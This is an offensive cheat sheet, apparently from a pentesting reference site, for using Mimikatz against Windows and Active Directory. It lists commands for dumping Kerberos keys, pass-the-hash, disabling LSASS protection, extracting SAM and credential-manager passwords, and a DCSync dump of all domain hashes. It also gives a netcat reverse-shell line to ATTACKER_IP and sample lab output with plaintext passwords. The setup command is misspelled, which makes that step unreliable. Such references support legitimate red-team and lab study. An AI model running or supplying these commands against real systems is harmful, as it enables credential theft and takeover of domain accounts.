https://tools.thehacker.recipes/mimikatz

### Required:
- NT AUTHORITY SYSTEM priveleges
- mimikatz binary on the system (location: `/usr/share/mimikatz`)

### Setting up
Do this before any of the next options
```
privilege::deubg    // NOTE: only follow through if response is "[20] OK", otherwise (when it throws an error) commands will run but not work correctly.
// Possible error: ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061 --> not ran as admin

token::elevate      // Impersonates admin token
```

### Dumping kerberos keys + pass the key
(pass the key is also called "Overpass the hash")
```
sekurlsa::ekeys
token::revert                                                                 // required for passing the hash
sekurlsa::pth /user:USER /domain:DOMAIN /rc4:RC4_HASH /run:"COMMAND"          // With RC4 hash
sekurlsa::pth /user:USER /domain:DOMAIN /aes128:AES128_HASH /run:"COMMAND"    // With AES128 hash
sekurlsa::pth /user:USER /domain:DOMAIN /aes256:AES256_HASH /run:"COMMAND"    // With AES256 hash
```
Note: if you have `nc64.exe` on the system, use the following payload for a reverse shell:
```
c:\Windows\Temp\nc64.exe -e cmd.exe ATTACKER_IP ATTACKER_PORT
```
Note 2: because the "credentials" are injected after you've passed the key, if `winrs.exe` is available, you can use it without giving credentials:
```
winrs.exe -r:THMIIS.za.tryhackme.com cmd      // Spawns a shell on the THMIIS machine of the za.tryhackme.md domain.
```


### Dumping logonpasswords / handling "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)"
Logonpasswords dumps all logged-on users.
```
mimikatz # sekurlsa::logonpasswords  
// If this gives the "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)"
// When you get this error, it means the LSASS is protected. You need the "mimidrv.sys" for this. (included in the directory)

mimikatz # !+        
// Loads the mimidrv
Expected output:
"
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
"
mimikatz # !processprotect /process:lsass.exe /remove
// Removes the protected state from the LSASS
Expected output:
"
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
"
mimikatz # sekurlsa::logonpasswords  
// It should work now.
```

### handling "ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list"
Make sure to use the correct architecture Mimikatz (`win64`/`win32`)

### General SAM passwords (local accounts)
```
mimikatz # lsadump::sam
```
Note: Any hashes can be used to pass to SMBClient (including Administrator hashes, combined with `-U Administrator`)

### Windows credential manager
```
sekurlsa::credman  // Dumps all windows credential manager credentials. (saved windows credentials)
```
This will get most credentials, but not the Web credentials. for these, use `Get-WebCredentials.ps1` (you can check if they exist using `vaultcmd /listcreds:"Web Credentials" /all`)
#### Example output
```
PS C:\Tools\Mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

736     {0;000003e7} 1 D 26914          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0025ebf6} 2 F 4320524     THM\thm S-1-5-21-1966530601-3185510712-10604624-1114    (16g,26p)       Primary
 * Thread Token  : {0;000003e7} 1 D 4369062     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # sekurlsa::credman

Authentication Id : 0 ; 34477 (00000000:000086ad)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 8/11/2023 11:29:59 AM
SID               : S-1-5-96-0-0
        credman :

Authentication Id : 0 ; 31779 (00000000:00007c23)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 8/11/2023 11:29:48 AM
SID               :
        credman :

Authentication Id : 0 ; 2485238 (00000000:0025ebf6)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 8/11/2023 11:44:59 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 2454892 (00000000:0025756c)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 8/11/2023 11:44:57 AM
SID               : S-1-5-90-0-2
```

### Active Directory DCSync attack
###### Required permissions: Domain Replication permissions (Domain Controller / Domain Administrator)
To dump one user, use:
```
privilege::elevate
lsadump::dcsync /domain:DOMAIN /user:USERNAME@DOMAIN                // Note: the ERROR_NOT_UNIQUE error means the DOMAIN name isn't specified
```

To dump everything:
```
privilege::elevate
log dcdump.txt
lsadump::dcsync /domain:DOMAIN /all
```
